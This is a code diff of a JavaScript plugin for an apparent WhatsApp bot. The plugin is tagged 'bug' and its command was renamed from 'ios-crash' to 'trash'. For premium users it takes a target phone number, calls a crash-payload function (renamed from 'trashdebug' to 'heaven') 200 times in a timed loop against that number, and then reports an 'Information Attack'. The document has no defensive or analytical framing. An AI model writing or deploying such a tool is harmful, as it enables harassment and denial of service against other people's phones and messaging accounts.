@@ -1,6 +1,6 @@
 const axios = require("axios");
  
-let trashplug = async (m, { trashdebug,reply,text,isPremium,prefix,command,trashcore,sleep }) => {
+let trashplug = async (m, { heaven,reply,text,isPremium,prefix,command,trashcore,sleep }) => {
 if (!isPremium) return reply(mess.premium)
 if (!text) return reply(`*Format Invalid!*\nUse: ${prefix + command} 254xxx`)
     
@@ -15,12 +15,12 @@ await trashcore.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
 await trashcore.sendMessage(m.chat, { react: { text: '🆘', key: m.key } }); 
 reply(process) 
 for (let r = 0; r < 50; r++) {
-await trashdebug(isTarget);
+await heaven(isTarget);
 await sleep(5000)
-await trashdebug(isTarget);
-await trashdebug(isTarget);
+await heaven(isTarget);
+await heaven(isTarget);
 await sleep(5000)
-await trashdebug(isTarget);
+await heaven(isTarget);
 }
 
 let put = `*Information Attack*
@@ -33,6 +33,6 @@ reply(put)
 };  
 trashplug.help = ['trash']
 trashplug.tags = ['bug']
-trashplug.command = ['ios-crash']
+trashplug.command = ['trash']
  
 module.exports = trashplug;
